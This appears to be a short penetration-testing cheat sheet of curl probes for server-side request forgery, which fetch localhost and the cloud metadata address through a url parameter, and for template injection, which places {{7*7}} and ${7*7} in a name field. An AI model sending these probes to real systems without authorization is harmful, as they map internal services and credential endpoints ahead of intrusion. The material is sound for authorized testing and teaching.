# SSRF and SSTI probes

Small probes for server-side fetch and template behaviour.

<div class="ol-section-kicker"><span>WEB</span></div>

## SSRF localhost probe

```bash
curl -sk 'https://<TARGET>/fetch?url=http://127.0.0.1/'
```

**Tool:** curl · **Platform:** Cross-platform · **Context:** No auth · **Noise:** Moderate


## SSRF metadata-shaped probe

```bash
curl -sk 'https://<TARGET>/fetch?url=http://169.254.169.254/'
```

**Tool:** curl · **Platform:** Cross-platform · **Context:** No auth · **Noise:** Moderate


## SSTI Jinja-style arithmetic

```bash
curl -skG https://<TARGET>/ --data-urlencode 'name={{7*7}}'
```

**Tool:** curl · **Platform:** Cross-platform · **Context:** No auth · **Noise:** Moderate


## SSTI alternate arithmetic

```bash
curl -skG https://<TARGET>/ --data-urlencode 'name=${7*7}'
```

**Tool:** curl · **Platform:** Cross-platform · **Context:** No auth · **Noise:** Moderate

---

**Related:** [Overview](./) · [Request Smuggling](request-smuggling.md) · [Technologies](technologies.md)
